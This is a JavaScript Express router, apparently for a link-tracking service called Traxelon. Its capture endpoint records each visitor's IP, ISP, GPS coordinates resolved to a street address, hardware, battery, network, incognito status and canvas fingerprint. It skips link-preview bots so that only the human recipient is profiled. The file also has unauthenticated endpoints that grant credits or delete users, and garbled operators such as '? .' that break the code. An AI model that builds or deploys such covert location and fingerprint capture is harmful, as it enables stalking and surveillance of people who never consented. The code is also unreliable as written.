import express from "express";
import axios from "axios";
import { createTrackingLink, recordCapture, addCredits } from "../utils/linkService.js";

const router = express.Router();

// ── Parse browser/OS/device from User-Agent ──────────────────

function parseBrowser(ua = "") {
    if (/Edg\//i.test(ua)) return "Edge";
    if (/OPR|Opera/i.test(ua)) return "Opera";
    if (/SamsungBrowser/i.test(ua)) return "Samsung Browser";
    if (/Chrome/i.test(ua)) return "Chrome";
    if (/Firefox/i.test(ua)) return "Firefox";
    if (/Safari/i.test(ua)) return "Safari";
    return "Unknown";
}

function parseOS(ua = "") {
    if (/Windows NT 10\.0/i.test(ua)) return "Windows 10/11";
    if (/Windows/i.test(ua)) return "Windows";
    const androidMatch = ua.match(/Android ([\d.]+)/i);
    if (androidMatch) return `Android ${androidMatch[1]}`;
    const iosMatch = ua.match(/iPhone OS ([\d_]+)/i);
    if (iosMatch) return `iOS ${iosMatch[1].replace(/_/g, ".")}`;
    if (/iPad.*OS ([\d_]+)/i.test(ua)) return "iPadOS";
    if (/Mac OS X/i.test(ua)) return "macOS";
    if (/Linux/i.test(ua)) return "Linux";
    return "Unknown";
}

function parseDevice(ua = "") {
    if (/Mobi|Android.*Mobile/i.test(ua)) return "Mobile";
    if (/Tablet|iPad/i.test(ua)) return "Tablet";
    return "Desktop";
}

// ── Get real IP ───────────────────────────────────────────────

function getClientIP(req) {
    const forwarded = req.headers["x-forwarded-for"];
    if (forwarded) return forwarded.split(",")[0].trim();
    return req.socket ? .remoteAddress || req.ip || "Unknown";
}

// ── Reverse geocode GPS → address via Nominatim ───────────────

async function reverseGeocode(lat, lon) {
    try {
        const res = await axios.get(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`, {
                headers: {
                    "User-Agent": "Traxelon/1.0",
                    Accept: "application/json",
                },
                timeout: 6000,
            }
        );
        const data = res.data;
        const addr = data.address || {};
        return {
            gpsAddress: data.display_name || null,
            gpsCity: addr.city || addr.town || addr.village || addr.county || null,
            gpsState: addr.state || null,
            gpsPincode: addr.postcode || null,
            gpsCountry: addr.country || null,
        };
    } catch {
        return {};
    }
}

// ── IP enrichment via ip-api.com ──────────────────────────────

async function enrichIP(ip) {
    try {
        if (!ip || ip === "::1" || ip.startsWith("127.") || ip.startsWith("192.168.") || ip.startsWith("10.")) {
            return { note: "Local IP — no enrichment" };
        }
        const res = await axios.get(
            `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,query`, { timeout: 5000 }
        );
        const d = res.data;
        if (d.status !== "success") return {};
        return {
            country: d.country,
            countryCode: d.countryCode,
            region: d.regionName,
            city: d.city,
            zip: d.zip,
            lat: d.lat,
            lon: d.lon,
            timezone: d.timezone,
            isp: d.isp,
            org: d.org,
            asn: d.as,
            hostname: d.reverse || null,
        };
    } catch {
        return {};
    }
}

// ── Routes ────────────────────────────────────────────────────

router.get("/health", (_req, res) => res.status(200).json({ ok: true }));

// POST /api/links/capture
router.post("/capture", async(req, res) => {
    try {
        const {
            token,
            // GPS
            gpsLat,
            gpsLon,
            gpsAccuracy,
            // Hardware
            cpuCores,
            ram,
            gpu,
            gpuVendor,
            maxTouchPoints,
            // Battery
            batteryLevel,
            batteryCharging,
            // Screen
            screenWidth,
            screenHeight,
            screenAvailWidth,
            screenAvailHeight,
            colorDepth,
            pixelDepth,
            pixelRatio,
            windowWidth,
            windowHeight,
            // Browser
            language,
            languages,
            platform,
            cookiesEnabled,
            doNotTrack,
            historyLength,
            referrer,
            // Network
            connectionType,
            connectionDownlink,
            connectionRtt,
            connectionSaveData,
            // Privacy & Fingerprint
            incognito,
            canvasHash,
        } = req.body;

        if (!token) return res.status(400).json({ error: "token is required" });

        const ua = req.headers["user-agent"] || "";

        // ── Bot filter ────────────────────────────────────────────
        const BOT_PATTERNS = /bot|crawl|spider|preview|slurp|facebookexternalhit|whatsapp|telegram|slack|discord|curl|wget|python|java|go-http|axios|node-fetch|undici/i;
        if (BOT_PATTERNS.test(ua)) {
            return res.status(200).json({ found: true, destinationUrl: null });
        }
        if (!screenWidth && !gpsLat && (!ua || ua.length < 40)) {
            return res.status(200).json({ found: true, destinationUrl: null });
        }
        // ─────────────────────────────────────────────────────────

        const ip = getClientIP(req);
        const ipData = await enrichIP(ip);

        // Reverse geocode GPS server-side (no CORS issues)
        let geoData = {};
        if (gpsLat && gpsLon) {
            geoData = await reverseGeocode(gpsLat, gpsLon);
        }

        const deviceData = {
            ip,

            // IP-based location (approximate)
            country: ipData.country || null,
            countryCode: ipData.countryCode || null,
            region: ipData.region || null,
            city: ipData.city || null,
            zip: ipData.zip || null,
            lat: ipData.lat || null,
            lon: ipData.lon || null,
            timezone: ipData.timezone || null,
            isp: ipData.isp || null,
            org: ipData.org || null,
            asn: ipData.asn || null,
            hostname: ipData.hostname || null,

            // GPS (exact — only if user allowed location)
            gpsLat: gpsLat || null,
            gpsLon: gpsLon || null,
            gpsAccuracy: gpsAccuracy || null,
            gpsAddress: geoData.gpsAddress || null,
            gpsCity: geoData.gpsCity || null,
            gpsState: geoData.gpsState || null,
            gpsPincode: geoData.gpsPincode || null,
            gpsCountry: geoData.gpsCountry || null,

            // Browser (parsed from UA server-side)
            browser: parseBrowser(ua),
            os: parseOS(ua),
            device: parseDevice(ua),
            userAgent: ua,
            referrer: referrer || null,

            // Hardware
            cpuCores: cpuCores || null,
            ram: ram || null,
            gpu: gpu || null,
            gpuVendor: gpuVendor || null,
            maxTouchPoints: maxTouchPoints ? ? null,

            // Battery
            batteryLevel: batteryLevel ? ? null,
            batteryCharging: batteryCharging ? ? null,

            // Screen
            screenWidth: screenWidth || null,
            screenHeight: screenHeight || null,
            screenAvailWidth: screenAvailWidth || null,
            screenAvailHeight: screenAvailHeight || null,
            colorDepth: colorDepth || null,
            pixelDepth: pixelDepth || null,
            pixelRatio: pixelRatio || null,
            windowWidth: windowWidth || null,
            windowHeight: windowHeight || null,

            // Browser extras
            language: language || null,
            languages: languages || null,
            platform: platform || null,
            cookiesEnabled: cookiesEnabled ? ? null,
            doNotTrack: doNotTrack || null,
            historyLength: historyLength || null,

            // Network
            connectionType: connectionType || null,
            connectionDownlink: connectionDownlink || null,
            connectionRtt: connectionRtt || null,
            connectionSaveData: connectionSaveData ? ? null,

            // Privacy & Fingerprint
            incognito: incognito ? ? null,
            canvasHash: canvasHash || null,
        };

        const result = await recordCapture(token, deviceData);
        return res.status(200).json(result);
    } catch (err) {
        console.error("[POST /capture]", err.message);
        return res.status(500).json({ error: "Failed to record capture" });
    }
});

// POST /api/links/shorten (create tracking link from backend)
router.post("/shorten", async(req, res) => {
    try {
        const { uid, label } = req.body;
        if (!uid) return res.status(400).json({ error: "uid is required" });
        const result = await createTrackingLink(uid, label);
        return res.status(200).json(result);
    } catch (err) {
        console.error("[POST /shorten]", err.message);
        return res.status(400).json({ error: err.message });
    }
});

// GET /api/links/geo-ip
router.get("/geo-ip", async(req, res) => {
    const ip = getClientIP(req);
    const data = await enrichIP(ip);
    return res.status(200).json(data);
});

// POST /api/links/credits
router.post("/credits", async(req, res) => {
    try {
        const { uid, amount } = req.body;
        if (!uid || !amount) return res.status(400).json({ error: "uid and amount required" });
        await addCredits(uid, Number(amount));
        return res.status(200).json({ success: true });
    } catch (err) {
        return res.status(500).json({ error: err.message });
    }
});

router.post("/delete-user", async(req, res) => {
    try {
        const { uid } = req.body;
        if (!uid) return res.status(400).json({ error: "uid required" });
        const adminApp = (await
            import ("../firebase/config.js")).default;
        await adminApp.auth().deleteUser(uid);
        const { db } = await
        import ("../firebase/config.js");
        await db.collection("users").doc(uid).delete();
        return res.status(200).json({ success: true });
    } catch (err) {
        console.error("[delete-user]", err.message);
        return res.status(500).json({ error: err.message });
    }
});

export default router;